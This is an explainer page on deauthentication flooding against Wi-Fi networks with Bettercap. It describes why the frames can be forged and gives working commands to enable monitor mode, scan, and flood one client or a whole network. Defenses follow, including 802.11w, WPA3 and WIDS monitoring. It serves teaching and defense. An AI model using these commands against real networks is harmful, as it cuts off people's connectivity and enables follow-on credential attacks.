Deauth Flooder

Sending forged 802.11 deauthentication frames with Bettercap to knock clients off a wireless network, disrupting connectivity or forcing a reconnect.

01What it is

802.11 management frames — including deauthentication frames — are unauthenticated in WPA2 networks. Anyone within radio range can forge a deauth frame that appears to come from the access point or a client, and the receiving device will honor it and disconnect. Sent repeatedly, this becomes a flood that keeps one client, or an entire network, from staying connected.

02How it works

Bettercap puts a wireless adapter into monitor mode and identifies the target access point and client. It then transmits spoofed deauth frames on the AP's behalf, addressed either to a specific client or as a broadcast to every associated device. Because the frames are unencrypted and unauthenticated, the client has no way to tell they're forged, and drops its connection.

  • Put the adapter into monitor mode
  • Scan for the target access point and clients
  • Select a specific client, or target the whole network with a broadcast
  • Flood deauth frames continuously to keep the target disconnected
  • Stop the flood to let connections resume
1 · monitor mode 
sudo airmon-ng start wlan0
2 · launch bettercap 
sudo bettercap -iface wlan0mon
3 · scan for target 
wifi.recon on
wifi.show
4 · flood a single client 
wifi.deauth AA:BB:CC:DD:EE:FF
5 · flood the whole network 
set wifi.deauth.skip-broadcast false
wifi.deauth AA:BB:CC:DD:EE:FF
6 · stop the flood 
wifi.recon off
Note

A deauth flood is a denial-of-service, not an intrusion — it doesn't reveal credentials on its own. It's most often paired with another technique, like handshake capture or an evil twin, where forcing a reconnect creates the opportunity the attacker actually wants.

03Detection & defense

Because deauth frames are unencrypted, a flood produces an obvious burst of management traffic aimed at one BSSID, which most wireless intrusion detection systems flag immediately. The signature is easy to spot even without deep packet inspection: a wall of deauth frames arriving far faster than any legitimate client would generate.

  • Enable 802.11w (management frame protection) so deauth and disassoc frames must be authenticated
  • Move to WPA3, which mandates protected management frames
  • Monitor for abnormal deauth/disassoc traffic with a WIDS
  • Treat repeated disconnects on a network as a signal to investigate, not just a Wi-Fi glitch
